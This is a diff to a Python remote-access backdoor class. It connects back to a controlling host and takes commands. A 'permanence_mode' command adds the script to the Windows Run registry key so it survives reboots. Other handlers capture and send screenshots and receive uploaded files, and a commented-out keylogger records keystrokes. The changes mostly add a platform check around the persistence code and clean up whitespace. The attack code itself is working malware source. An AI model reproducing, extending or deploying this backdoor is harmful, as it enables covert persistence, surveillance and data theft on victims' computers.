@@ -60,7 +60,7 @@ class Backdoor:
                 self.sock.connect((self.host, self.port))
                 print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
                 connected = True
-                
+
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
                 sys.exit()
@@ -110,28 +110,27 @@ class Backdoor:
                     if message_command_descrypt == "permanence_mode":
                         # reg.KEY_SET_VALUE
                         try:
+                            if sys.platform.startswith("Windows"):
+                                import winreg as reg
+                                pth = os.path.dirname(os.path.realpath(__file__))
+                                f_name = os.path.basename(__file__)
 
-                            import winreg as reg
-                            pth = os.path.dirname(os.path.realpath(__file__))
-                            f_name = os.path.basename(__file__)
+                                address = os.path.join(pth, f_name)
 
-                            address = os.path.join(pth, f_name)  
-                            
-                            # Key To Change: HKEY_CURRENT_USER  
-                            # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
-                            key = reg.HKEY_CURRENT_USER 
-                            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-                            
-                            # Opening Key To Make Changes 
-                            open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-                            
-                            # Modifiy The Key 
-                            reg.SetValueEx(open, "pyperm", 0, reg.REG_SZ, address) 
-                            
-                            # Closing 
-                            reg.CloseKey(open)
-                            self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))
+                                # Key To Change: HKEY_CURRENT_USER
+                                # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
+                                key = reg.HKEY_CURRENT_USER
+                                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
+                                # Opening Key To Make Changes
+                                openn = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+
+                                # Modifiy The Key
+                                reg.SetValueEx(openn, "pyperm", 0, reg.REG_SZ, address)
+
+                                # Closing
+                                reg.CloseKey(openn)
+                                self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))
 
                         except Exception as exc:
                             self.sock.send(str(exc).encode())
@@ -139,10 +138,11 @@ class Backdoor:
                     if message_command_descrypt == "disable_permanence":
                         self.sock.send("\033[31m[-] *\033[0;0m Desativating permanence mode...".encode())
                         try:
-                            import winreg as reg
-                            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
-                            reg.DeleteValue(key, "pyperm")
-                            reg.CloseKey(key)
+                            if sys.platform.startswith("Windows"):
+                                import winreg as reg
+                                key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
+                                reg.DeleteValue(key, "pyperm")
+                                reg.CloseKey(key)
 
                         except FileNotFoundError:
                             pass
@@ -163,6 +163,7 @@ class Backdoor:
                         with open(file_name, "rb") as sc:
                             screenshot_data = sc.read()
                             self.sock.send(screenshot_data)
+
                         print("Transference Done!")
 
 
@@ -228,7 +229,7 @@ class Backdoor:
                         up_data = b""
                         while len(up_data) < int_filesize:
                             up_data += self.sock.recv(int_filesize)
-                        
+
                         with open(up_filename, "wb") as up:
                             up.write(up_data)
 
@@ -303,7 +304,7 @@ class Backdoor:
 
     """def keylogger(self, key):
         current_key = str(key)
-        current_key = re.sub(r"Key.space"," ", current_key) 
+        current_key = re.sub(r"Key.space"," ", current_key)
         current_key = re.sub(r"Key.alt_1","\n", current_key)
         current_key = re.sub(r"Key.*","", current_key)
         self.count += 1
@@ -328,7 +329,7 @@ class Backdoor:
                 # sys.exit()
 
     def listener(self):
-        with Listener(on_press = self.keylogger) as l: 
+        with Listener(on_press = self.keylogger) as l:
             l.join()"""
 
 
